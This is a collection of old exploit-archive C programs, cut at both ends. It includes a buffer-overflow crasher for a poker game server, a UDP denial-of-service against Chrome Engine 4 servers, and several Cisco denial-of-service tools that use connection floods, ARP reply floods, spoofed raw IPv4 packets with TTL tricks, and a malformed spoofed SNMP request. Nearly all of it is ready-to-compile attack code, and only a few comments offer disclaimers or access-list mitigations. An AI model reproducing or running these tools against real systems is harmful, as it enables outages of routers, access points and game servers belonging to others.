    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define PORT    17573
#define TIMEOUT 5
#define EIP     "\xde\xc0\xad\xde"
#define BOF     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "\x4e\xe6\x40\xbb"  /* default exception handler sign [00515150] */ \
                EIP                 /* return address for the sprintf() bug      */ \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                EIP                 /* bypass exception handler */ \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaa\0"



void send_chmpoker(int sock, u_char *data, u_int len, u_int num1, u_int num2);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port = PORT;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Chris Moneymaker's World Poker Championship 1.0 buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- check server: ", stdout);
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(timeout(sd) < 0) {
        fputs("\nError: server doesn't seem to work, I have received no data\n\n", stdout);
        exit(1);
    }
    fputs("ok\n", stdout);

    fputs("- send malformed data size\n", stdout);
    send_chmpoker(sd, BOF, sizeof(BOF) - 1, 8, 3);

    sleep(ONESEC);
    close(sd);

    fputs("- the server should be crashed, check it manually\n", stdout);
    return(0);
}



void send_chmpoker(int sock, u_char *data, u_int len, u_int num1, u_int num2) {
    u_char  head[12];   // part of data, a lazy solution

    *(u_int *)(head)     = 0xdeadd001; // 02 and 03
    *(u_int *)(head + 4) = len + 12;
    send(sock, head, 8, 0);

    *(u_int *)(head)     = num1;
    *(u_int *)(head + 4) = len + 12;
    *(u_int *)(head + 8) = num2;
    send(sock, head, 12, 0);

    send(sock, data, len, 0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-08-17]
/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
    #define waitms(x)   sleep(x)
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define waitms(x)   sleep(x * 1000)
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        27632
#define BUFFSZ      1400



void chrome_hash(u8 *data, int len);
int udp_sock(void);
int putxx(u8 *data, u32 num, int bits);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Chrome Engine 4 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]>\n"
            "\n", argv[0], port);
        exit(1);
    }
    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = udp_sock();

    p = buff;
    p += putxx(p, 28,           8);     // other types of packets: 23, 38 (nop), 64, 67
    p += putxx(p, (-0x6f) - 5,  32);    // this is caused by wrong crc
    //p += putcc(p, 'A', (BUFFSZ - 2) - 5); // not needed since the crash is in malloc
    p += putxx(p, 0,            16);    // the WRONG crc
    if(sendto(sd, buff, p - buff, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    fputc('.', stdout);

    printf("\n- done, check the server manually\n");
    close(sd);
    return(0);
}



// the correct hash function plus the automatic adjusting of the size value
void chrome_hash(u8 *data, int len) {
    int     i;
    u16     crc = 1735;

    putxx(data + 1, len - 5, 32);
    for(i = 0; i < len; i++) {
        crc += (signed char)data[i];
    }
    data[i]   = crc;
    data[i+1] = crc >> 8;
}



int udp_sock(void) {
    static struct   linger  ling = {1,1};
    static int      on = 1;
    int     sd;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));
    return(sd);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        //data[i] = (num >> ((bytes - 1 - i) << 3));
        data[i] = (num >> (i << 3));
    }
    return(bytes);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/1211/info

Opening approximately 98 connections on port 23 will cause Cisco 760 Series Routers to self reboot. Continuously repeating this action will result in a denial of service attack.

/* Cisco 760 Series Connection Overflow
 *
 *
 * Written by: Tiz.Telesup
 * Affected Systems: Routers Cisco 760 Series, I havn't tested anymore
 * Tested on: FreeBSD 4.0 and Linux RedHat 6.0
 */


#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int     net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, char *sourceip,
        unsigned short int sourceport, int sec);


void    net_write (int fd, const char *str, ...);


unsigned long int       net_resolve (char *host);



        
void
usage (void)
{
        printf ("usage: ./cisco host times\n");
        exit (EXIT_FAILURE);
}


int
main (int argc, char *argv[])
{


        char                    host[256];
        int                     port,times,count,sd = 0;
        int                     m = 0;
        struct sockaddr_in      cs;


        printf ("Cisco 760 series Connection Overflow.\n");
        printf ("-------------------------------------\n");
        
        if (argc < 3)
        usage();
        
        strcpy (host, argv[1]);
        times=atoi (argv[2]);
        
        if ((times < 1) || (times > 10000)) /*Maximum number of connections*/
                usage();



        port =23; /* This might be changed to the telnet port of the router*/
        


        printf ("Host: %s Times: %d\n", host, times);
        for (count=0;count<times;count++){
                printf ("Connecting... Connection number %d \n",count);
                fflush (stdout);
                sd = net_connect (&cs, host, port, NULL, 0, 30);


                if (sd < 1) {
                        printf ("failed!\n");
                        exit (EXIT_FAILURE);
                        }


        
                net_write (sd, "AAAA\n\n");


        }


        exit (EXIT_SUCCESS);
}


int
net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, char *sourceip,
                unsigned short int sourceport, int sec)
{
        int             n, len, error, flags;
        int             fd;
        struct timeval  tv;
        fd_set          rset, wset;


        /* first allocate a socket */
        cs->sin_family = AF_INET;
        cs->sin_port = htons (port);


        fd = socket (cs->sin_family, SOCK_STREAM, 0);
        if (fd == -1)
                return (-1);


        if (!(cs->sin_addr.s_addr = net_resolve (server))) {
                close (fd);
                return (-1);
        }


        flags = fcntl (fd, F_GETFL, 0);
        if (flags == -1) {
                close (fd);
                return (-1);
        }
        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
        if (n == -1) {
                close (fd);
                return (-1);
        }


        error = 0;


        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
        if (n < 0) {
                if (errno != EINPROGRESS) {
                        close (fd);
                        return (-1);
                }
        }
        if (n == 0)
                goto done;


        FD_ZERO(&rset);
        FD_ZERO(&wset);
        FD_SET(fd, &rset);
        FD_SET(fd, &wset);
        tv.tv_sec = sec;
        tv.tv_usec = 0;


        n = select(fd + 1, &rset, &wset, NULL, &tv);
        if (n == 0) {
                close(fd);
                errno = ETIMEDOUT;
                return (-1);
        }
        if (n == -1)
                return (-1);


        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
                        len = sizeof(error);
                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
                                errno = ETIMEDOUT;
                                return (-1);
                        }
                        if (error == 0) {
                                goto done;
                        } else {
                                errno = error;
                                return (-1);
                        }
                }
        } else
                return (-1);


done:
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
                return (-1);
        return (fd);
}


unsigned long int
net_resolve (char *host)
{
        long            i;
        struct hostent  *he;


        i = inet_addr(host);
        if (i == -1) {
                he = gethostbyname(host);
                if (he == NULL) {
                        return (0);
                } else {
                        return (*(unsigned long *) he->h_addr);
                }
        }
        return (i);
}


void
net_write (int fd, const char *str, ...)
{
        char    tmp[8192];
        va_list vl;
        int     i;


        va_start(vl, str);
        memset(tmp, 0, sizeof(tmp));
        i = vsnprintf(tmp, sizeof(tmp), str, vl);
        va_end(vl);


        send(fd, tmp, i, 0);
        return;
}//
// Cisco Killer - ciskill.c
//
// Usage: ./ciskill [device]
//
// Author: Pasv (pasvninja [at] gmail.com)
//
// Credit: This exploit takes advantage of a vulnerability that was
// discovered by Eric Smith on January 12, 2006 (bid:16217)
//
// Greets to NW, zimmy, GSO, and the rest.
//
// Description: The vulnerability exists in the way the affected versions
// below handle ARP replies, if enough specially crafted ARP packets are sent
// on the network with the affected systems it will cause the access point memory
// exhaustion which will in a few seconds (depending on the speed of the attacker
// and the memory of the target) crash the system, making all ingoing/outgoing
// traffic stopped.
//
// Disclaimer: I pity the foo who uses this exploit for evil, I take no responsibility
// for your actions (like a knife maker).
//
// Versions affected:
//  Cisco Aironet 350 IOS
//  Cisco Aironet 1400
//  Cisco Aironet 1300
//  Cisco Aironet 1240AG
//  Cisco Aironet 1230AG
//  Cisco Aironet 1200
//  Cisco Aironet 1130AG
//  Cisco Aironet 1100
// (this includes most linksys wireless access points)



#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/sockios.h>

// Edit this packet accordingly if the target is picky
char pkt[]=
// Ethernet header
"\xff\xff\xff\xff\xff\xff" 	// Destination: broadcast
"AAAAAA"			// Source: 41:41:41:41:41:41
"\x08\x06"			// Pkt type: ARP
// ARP header
"\x00\x01"			// Hardware type: Ethernet
"\x08\x00"			// Protocol: IP
"\x06"				// Hardware size: 6
"\x04"				// Protocol size: 4
"\x00\x02"			// Opcode: Reply
"AAAAAA"			// Sender (Mac): 41:41:41:41:41:41
"AAAA"				// Sender (IP): 65.65.65.65
"AAAAAA"			// Target (mac): 41:41:41:41:41:41
"AAAA"				// Target (IP): 65.65.65.65
; // End of Packet

int main(int argc, char **argv) {
	FILE *fp;
	int sock, seed;
	long count;
	char *device;
	in_addr_t addr;
	struct sockaddr sin;
	
	printf("CisKill -- Aironet Cisco Killer\nCoded by: Pasv\nDiscovery credit: Eric Smith\n");
	if(getuid()) {
		printf("Must be root to inject arp packets!\n");
		exit(1);
	}
	
	if(argc != 2) {
		strcpy(device,"wlan0");
	}
	else {
		device=argv[1];
	}

	fp = fopen("/dev/urandom", "r");
	fscanf(fp,"%d", &seed);
	fclose(fp);
	srand(seed);
	
	memset(&sin, 0, sizeof(sin));
	sin.sa_family = AF_UNSPEC;
	strncpy(sin.sa_data,device, 14);
	
	sock = socket(PF_INET, SOCK_PACKET, 0x300);
	
	printf("Using device: %s\n\n", device);	
	
	// stupid
	printf("Press ctrl+c immediately if you wish to stop\nGoing in 5\n");
	sleep(1);printf(" 4\n");sleep(1);printf(" 3\n");sleep(1);printf(" 2\n");sleep(1);printf(" 1!\n");sleep(1);
	
	while(1) {
		addr = (rand()%0xff)+(rand()%0xff)+(rand()%0xff)+(rand()%0xff);
		pkt[28] = (char)addr;
		pkt[38] = (char)addr;
		count++;
		printf("#:%ld bytes sent: %d (should be 42)\n",count,  sendto(sock, pkt, 42, 0, (struct sockaddr *)&sin, sizeof(sin)));
	}
}

// milw0rm.com [2006-01-25]
/*******************************************************/
/* cisco-bug-44020.c - Copyright by Martin Kluge (martin@elxsi.de) */
/*                                                                                            */
/* Feel free to modify this code as you like, as long as you include */
/* the above copyright statement.                                               */
/*                                                                                            */
/* Please use this code only to check your OWN cisco routers.         */
/*                                                                                            */
/*                                                                                            */
/* This exploit uses the bug in recent IOS versions to stop router    */
/* from processing traffic once the input queue is full.                    */
/*                                                                                            */
/*                                                                                            */
/* Use access control lists as described in the CISCO advisory to     */
/* protect your cisco routers:                                                       */
/*                                                                                            */
/* access-list 101 deny 53 any any                                              */
/* access-list 101 deny 55 any any                                              */
/* access-list 101 deny 77 any any                                              */
/* access-list 101 deny 103 any any                                            */
/*                                                                                            */
/* This code was only tested on linux, no warranty is or will be        */
/*                                                                                            */
/* Usage: ./cisco-bug-44020 <src ip> <dst ip> <hops> <number>  */
/* Source IP: Your source IP (or a spoofed source IP)                    */
/* Destination IP: The IP of the vulnerable cisco router                  */
/* Hops: The number of hops between you and the router,             */
/* the time to live (ttl) should be 0 when the packet                      */
/* is received by the cisco router.                                                 */
/* Number: Number of packets to send (0 = loop)                         */
/* provided.                                                                              */
/*******************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define DEBUG

#ifndef IPPROTO_RAW
#define IPPROTO_RAW 0
#endif

/* IPv4 header */
struct ipv4_pkt_header {
unsigned int ipvhl:8; /* Version + Header length */
unsigned int type_service:8; /* TOS(Type of Service) field */
unsigned short packet_len; /* Header+Payload length */
unsigned short ident; /* Identification field */
unsigned short fragment; /* Fragment Offset field */
unsigned int time_live:8; /* TTL(Time to Live) field */
unsigned int protocol:8; /* Protocol field */
unsigned short sum; /* Checksum field */
struct in_addr src_ip; /* Source IP */
struct in_addr dst_ip; /* Destination IP */
};


char proto[] = {53,55,77,103};


/* Prototypes */
int in_cksum (unsigned short *, int, int);


/* Main function */
int main (int argc, char *argv[]) {
struct ipv4_pkt_header ipv4_hdr;
struct sockaddr_in sin;
struct timeval seed;

unsigned long src_ip, dst_ip;
int fd, hops, count, bytes;
int len=0, i=0, n=0, loop=0;

unsigned char *buf;

/* Check command line args */ 
if(argc != 5) {
fprintf(stderr, "Usage: %s <src ip> <dst ip> <hops> <number>\n\n", argv[0]);
return(EXIT_FAILURE);
}

src_ip = inet_addr(argv[1]);
dst_ip = inet_addr(argv[2]);
hops = atoi(argv[3]);
count = atoi(argv[4]);

if(count == 0) { loop=1; count=1; }

#ifdef DEBUG
printf("DEBUG: Hops: %i\n", hops);
#endif

/* Open a raw socket */
if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
fprintf(stderr, "Error: Cannot open raw socket.\n");
return(EXIT_FAILURE);
}

/* Build the IPv4 header */
ipv4_hdr.ipvhl = ((4 << 4) | 0x0f) & (5 | 0xf0); /* :) */
ipv4_hdr.type_service = 0x10;

#ifdef OSTYPE_BSD
ipv4_hdr.packet_len = 0x14 + len;
ipv4_hdr.fragment = 0x4000;
#else
ipv4_hdr.packet_len = htons(0x14 + len);
ipv4_hdr.fragment = htons(0x4000);
#endif

ipv4_hdr.time_live = hops;
ipv4_hdr.src_ip.s_addr = src_ip;
ipv4_hdr.dst_ip.s_addr = dst_ip;

while(n < count) {
/* Seed the random generator */
if(gettimeofday(&seed, NULL) == -1) {
fprintf(stderr, "Error: Cannot seed the random generator.\n");
return(EXIT_FAILURE);
}

srandom((unsigned int) (seed.tv_sec ^ seed.tv_usec));

ipv4_hdr.protocol = proto[random() % 0x4];

#ifdef DEBUG
printf("DEBUG: Protocol: %i\n", ipv4_hdr.protocol);
#endif

ipv4_hdr.ident = htons(random() % 0x7fff);

/* Calculate checksum */
ipv4_hdr.sum = 0x0000;
ipv4_hdr.sum = in_cksum((unsigned short *) &ipv4_hdr, 0x14 + len, 0);

#ifdef DEBUG
printf("DEBUG: Checksum: %i\n", ipv4_hdr.sum);
#endif

buf = malloc(0x14 + len);
memset(buf, '\0', 0x14 + len);

memcpy((unsigned char *) buf, (unsigned char *) &ipv4_hdr,
0x14 + len);

#ifdef DEBUG
printf("DEBUG: ");
for(i=0; i < 0x14 + len; i++)
printf(" %02x", buf[i]);
printf("\n");
#endif


memset(&sin, '\0', sizeof(struct sockaddr_in));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = dst_ip;

bytes = sendto(fd, buf, 0x14 + len, 0, (struct sockaddr *) &sin,
sizeof(struct sockaddr));

#ifdef DEBUG
printf("DEBUG: Wrote %i bytes.\n", bytes);
#endif

if(loop != 1) n++;

free(buf);
}

close(fd);
return(EXIT_SUCCESS);
}


int in_cksum(unsigned short *addr, int len, int csum) {
register int sum = csum;
unsigned short answer = 0;
register unsigned short *w = addr;
register int nleft = len;

/*
* Our algorithm is simple, using a 32 bit accumulator (sum), we add
* sequential 16 bit words to it, and at the end, fold back all the
* carry bits from the top 16 bits into the lower 16 bits.
*/
while (nleft > 1) {
sum += *w++;
nleft -= 2;
}

/* mop up an odd byte, if necessary */
if (nleft == 1) {
sum += htons(*(unsigned char *)w<<8);
}
/* add back carry outs from top 16 bits to low 16 bits */
sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
sum += (sum >> 16); /* add carry */
answer = ~sum; /* truncate to 16 bits */
return(answer);
}


// milw0rm.com [2003-07-21]
/*
* ShadowChode - Cisco IOS IPv4 Packet Processing Denial of Service Exploit
*
* Ping target router/switch for TTL to host. Subtract that number from 255
* and use that TTL on the command line. The TTL must equal 0 or 1 when it
* reaches the target. The target must accept packets to the given target
* interface address and there are some other caveats.
*
* BROUGHT TO YOU BY THE LETTERS C AND D
*
* [L0cK]
*/

#include <stdio.h>
#include <sys/types.h>

#include "libnet.h"

#define MIN_PAYLOAD_LEN (26)

#define CLEANUP { \
libnet_destroy(lh); \
free(payload); \
}

int
main(int argc, char *argv[])
{
char errbuf[LIBNET_ERRBUF_SIZE];
libnet_t *lh;
u_long dst_addr;
int ttl;
int payload_len;
char *payload;
libnet_ptag_t data_tag;
libnet_ptag_t ip_tag;
int i;
int len;
int protocols[] = { 53, 55, 77, 103 };
struct libnet_stats ls;

lh = libnet_init(LIBNET_RAW4, NULL, errbuf);

if (lh == NULL) {
(void) fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
exit(-1);
}

if (argc != 3 || (dst_addr = libnet_name2addr4(lh, argv[1], LIBNET_RESOLVE) == -1)) {
(void) fprintf(stderr, "Usage: %s <target> <ttl>\n", argv[0]);
libnet_destroy(lh);
exit(-1);
}

{ /* OH WAIT, ROUTE'S RESOLVER DOESN'T WORK! */
struct in_addr dst;

if (!inet_aton(argv[1], &dst)) {
perror("inet_aton");
libnet_destroy(lh);
exit(-1);
}

dst_addr = dst.s_addr;
}

ttl = atoi(argv[2]);

libnet_seed_prand(lh);

len = libnet_get_prand(LIBNET_PR8);

/* Mmmmm, suck up random amount of memory! */

payload_len = (MIN_PAYLOAD_LEN > len) ? MIN_PAYLOAD_LEN : len;

payload = (char *) malloc(payload_len);

if (payload == NULL) {
perror("malloc");
libnet_destroy(lh);
exit(-1);
}

for (i = 0; i < payload_len; i++) {
payload[i] = i;
}

data_tag = LIBNET_PTAG_INITIALIZER;

data_tag = libnet_build_data(payload, payload_len, lh, data_tag);

if (data_tag == -1) {
(void) fprintf(stderr, "Can't build data block: %s\n", libnet_geterror(lh));
CLEANUP;
exit(-1);
}

ip_tag = LIBNET_PTAG_INITIALIZER;

for (i = 0; i < 4; i++) {
ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + payload_len, 0, libnet_get_prand(LIBNET_PRu16),
 0, ttl, protocols[i], 0, libnet_get_prand(LIBNET_PRu32), dst_addr, NULL, 0, lh, ip_tag);

if (ip_tag == -1) {
(void) fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(lh));
CLEANUP;
exit(-1);
}

len = libnet_write(lh);

if (len == -1) {
(void) fprintf(stderr, "Write error: %s\n", libnet_geterror(lh));
}
}

libnet_stats(lh, &ls);

(void) fprintf(stderr, "Packets sent: %ld\n"
"Packet errors: %ld\n"
"Bytes written: %ld\n",
ls.packets_sent, ls.packet_errors, ls.bytes_written);

CLEANUP;

return (0);
}

// milw0rm.com [2003-07-18]
source: http://www.securityfocus.com/bid/4132/info

Cisco products contain multiple vulnerabilities in handling of SNMP requests and traps. A general report for multiple vendors was initially published on February 12 (Bugtraq IDs 4088 and 4089), however more information is now available and a separate Bugtraq ID has been allocated for the Cisco Operating Systems and Appliances vulnerabilities.

It is reportedly possible for a remote attacker to create a denial of service condition by transmitting a malformed SNMP request to a vulnerable Cisco Operating System or Appliance. The affected device may reset, or require a manual reset to regain functionality. 

/* This program send a spoofed snmpv1 get request that cause system reboot
   on Cisco 2600 routers with IOS version 12.0(10) 

   Author : kundera@tiscali.it   ... don't be lame use for testing only! ..:) */

#include 		<stdio.h>
#include 		<string.h>
#include 		<unistd.h>
#include 		<stdlib.h>
#include 		<sys/socket.h>
#include 		<netinet/in.h>
#include		<netinet/ip.h>
#include		<netinet/udp.h>
#include		<arpa/inet.h>

	

struct in_addr sourceip_addr;
struct in_addr destip_addr;
struct sockaddr_in dest;

struct ip          *IP;  
struct udphdr      *UDP;   
int p_number=1,sok,datasize,i=0; 

char *packet,*source,*target; 
char *packetck;
char *data,c;

char snmpkill[] =  
  "\x30\x81\xaf\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x81"  
  "\xa1\x02\x02\x09\x28\x02\x01\x00\x02\x01\x00\x30\x81\x94\x30\x81"  
  "\x91\x06\x81\x8c\x4d\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x81\xff\xff\xff\xff\xff\xff\xff\xff\x7f"  
  "\x05";


struct pseudoudp {
u_long ipsource;
u_long ipdest;
char zero;
char proto;
u_short length;
} *psudp;


in_cksum (unsigned short *ptr, int nbytes)
{

  register long sum;		/* assumes long == 32 bits */
  u_short oddbyte;
  register u_short answer;	/* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
    {
      sum += *ptr++;
      nbytes -= 2;
    }

  /* mop up an odd byte, if necessary */
  if (nbytes == 1)
    {
      oddbyte = 0;		/* make sure top half is zero */
      *((u_char *) & oddbyte) = *(u_char *) ptr;	/* one byte only */
      sum += oddbyte;
    }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
  sum += (sum >> 16);		/* add carry */
  answer = ~sum;		/* ones-complement, then truncate to 16 bits */
  return (answer);
}


void usage (void)
{
printf("Kundera CiscoKill v1.0\n");
printf("Usage: ciscokill [-n number of packets] [-s source ip_addr] -t ip_target \n");
}



int main(int argc,char **argv){

if (argc < 2){
usage();
exit(1);
}

while((c=getopt(argc,argv,"s:t:n:"))!=EOF){
	switch(c) {
	 case 's': source=optarg; break;
	 case 'n': p_number=atoi(optarg); break;
	 case 't': target=optarg;
	 }
}

if ( (sok=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
{
	printf("Can't create socket.\n");
        exit(EXIT_FAILURE);
}

destip_addr.s_addr=inet_addr(target);
sourceip_addr.s_addr=inet_addr(source);

datasize=sizeof(snmpkill);

packet = ( char * )malloc( 20 + 8 + datasize );

IP     = (struct ip     *)packet; 

memset(packet,0,sizeof(packet)); 
        
        IP->ip_dst.s_addr  = destip_addr.s_addr;
        IP->ip_src.s_addr  = sourceip_addr.s_addr;
        IP->ip_v = 4;
        IP->ip_hl = 5;
        IP->ip_ttl = 245;
        IP->ip_id = htons(666);
        IP->ip_p = 17;
        IP->ip_len  = htons(20 + 8 + datasize);
        IP->ip_sum    = in_cksum((u_short *)packet,20);

 
UDP   = (struct udphdr    *)(packet+20);
      UDP->source = htons(666); 
      UDP->dest   = htons(161);
      UDP->len     = htons(8+datasize);
      UDP->check = 0;
      packetck = (char *)malloc(8 + datasize + sizeof(struct pseudoudp));
      bzero(packetck,8 + datasize + sizeof(struct pseudoudp));     
      psudp = (struct pseudoudp *) (packetck);
      psudp->ipdest = destip_addr.s_addr;
      psudp->ipsource = sourceip_addr.s_addr;
      psudp->zero = 0;
      psudp->proto = 17;
      psudp->length = htons(8+datasize);
      memcpy(packetck+sizeof(struct pseudoudp),UDP,8+datasize);
